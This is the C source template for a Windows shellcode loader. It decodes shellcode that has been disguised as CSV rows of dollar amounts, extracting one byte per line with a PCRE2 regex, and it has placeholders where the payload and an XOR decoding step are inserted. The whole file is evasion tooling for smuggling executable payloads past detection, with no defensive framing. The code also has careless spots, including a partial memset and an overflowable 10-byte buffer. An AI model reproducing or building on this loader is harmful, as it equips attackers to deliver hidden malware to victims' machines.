#define PCRE2_CODE_UNIT_WIDTH 8
#define PCRE2_STATIC
#include <pcre2.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

###PAYLOAD###

struct csvdata
{
    unsigned char* shellcode;
    int size;
};

char *strremove(char *str, const char *sub)
{
    // https://stackoverflow.com/a/47117431
    char *p, *q, *r;
    if (*sub && (q = r = strstr(str, sub)) != NULL) {
        size_t len = strlen(sub);
        while ((r = strstr(p = r + len, sub)) != NULL) {
            while (p < r)
                *q++ = *p++;
        }
        while ((*q++ = *p++) != '\0')
            continue;
    }
    return str;
}

struct csvdata * GetShellcodeFromCSV()
{
  int sz = sizeof(payload) / sizeof(payload[0]);
  int holder[sz];
  int count = 0;
  memset(holder, 0, sz);

  char* temp = (char*)malloc(10);
  memset(temp, '\0', 10);    
  for (int line = 0; line < sz; ++line)
  {  

    pcre2_code *re;
    PCRE2_SPTR pattern;
    PCRE2_SPTR subject;
    PCRE2_SPTR name_table;

    int crlf_is_newline;
    int errornumber;
    int find_all;
    int i;
    int namecount;
    int name_entry_size;
    int rc;
    int utf8;

    uint32_t option_bits;
    uint32_t newline;

    PCRE2_SIZE erroroffset;
    PCRE2_SIZE *ovector;

    size_t subject_length;
    pcre2_match_data *match_data;

    find_all = 1;

    pattern = (PCRE2_SPTR)",\"\\$.{0,10}, \"\\$(\\d{1,3})";
    subject = (PCRE2_SPTR)payload[line];
    subject_length = strlen((char *)subject);

    re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED, 0, &errornumber, &erroroffset, NULL);

    if (re == NULL)
    {
      PCRE2_UCHAR buffer[256];
      pcre2_get_error_message(errornumber, buffer, sizeof(buffer));
      continue;
    }

    match_data = pcre2_match_data_create_from_pattern(re, NULL);

    rc = pcre2_match(re, subject, subject_length, 0, 0, match_data, NULL);

    if (rc < 0)
    {
      pcre2_match_data_free(match_data);
      pcre2_code_free(re);
      continue;
    }

    ovector = pcre2_get_ovector_pointer(match_data);

    if (rc == 0)
    {
      continue;
    }

    for (i = 0; i < rc; i++)
    {
      PCRE2_SPTR substring_start = subject + ovector[2*i];
      size_t substring_length = ovector[2*i+1] - ovector[2*i];
      sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
    }

    (void)pcre2_pattern_info(re, PCRE2_INFO_NAMECOUNT, &namecount);

    if (namecount > 0)
    {
      PCRE2_SPTR tabptr;
      (void)pcre2_pattern_info(re, PCRE2_INFO_NAMETABLE, &name_table);
      (void)pcre2_pattern_info(re, PCRE2_INFO_NAMEENTRYSIZE, &name_entry_size);

      tabptr = name_table;
      for (i = 0; i < namecount; i++)
      {
        int n = (tabptr[0] << 8) | tabptr[1];
        tabptr += name_entry_size;
      }
    }

    (void)pcre2_pattern_info(re, PCRE2_INFO_ALLOPTIONS, &option_bits);
    utf8 = (option_bits & PCRE2_UTF) != 0;
    (void)pcre2_pattern_info(re, PCRE2_INFO_NEWLINE, &newline);
    crlf_is_newline = newline == PCRE2_NEWLINE_ANY || newline == PCRE2_NEWLINE_CRLF || newline == PCRE2_NEWLINE_ANYCRLF;

    for (;;)
    {
      uint32_t options = 0;
      PCRE2_SIZE start_offset = ovector[1];

      if (ovector[0] == ovector[1])
      {
        if (ovector[0] == subject_length)
          {
            break;
          }
        options = PCRE2_NOTEMPTY_ATSTART | PCRE2_ANCHORED;
      }

      rc = pcre2_match(re, subject, subject_length, start_offset, options, match_data, NULL);

      if (rc == PCRE2_ERROR_NOMATCH)
      {
        if (options == 0) break;
        ovector[1] = start_offset + 1;
        if (crlf_is_newline && start_offset < subject_length - 1 && subject[start_offset] == '\r' && subject[start_offset + 1] == '\n')
        ovector[1] += 1;
        else if (utf8)
          {
            while (ovector[1] < subject_length)
            {
              if ((subject[ovector[1]] & 0xc0) != 0x80) break;
              ovector[1] += 1;
            }
        }
        continue;
      }

      if (rc < 0)
      {
        pcre2_match_data_free(match_data);
        pcre2_code_free(re);
        continue;
      }

      for (i = 0; i < rc; i++)
      {
        PCRE2_SPTR substring_start = subject + ovector[2*i];
        size_t substring_length = ovector[2*i+1] - ovector[2*i];
        sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
      }
    }

    // remove the final thousands count"
    strremove(temp, ",000\"");

    int intVal = atoi(temp);

    holder[count] = intVal;

    pcre2_match_data_free(match_data);
    pcre2_code_free(re);
    memset(temp, '\0', strlen(temp));
    count++;
  }

    free(temp);

    unsigned char shellcode[count];

    for (int i = 0; i < count; ++i)
    {
        shellcode[i] = (unsigned char)holder[i];
    }

    ###XOR_LOGIC###

    struct csvdata* d = malloc(sizeof(struct csvdata));
    d->shellcode = malloc(count);
    memcpy(d->shellcode, shellcode, count);
    d->size = count;

    return d;
}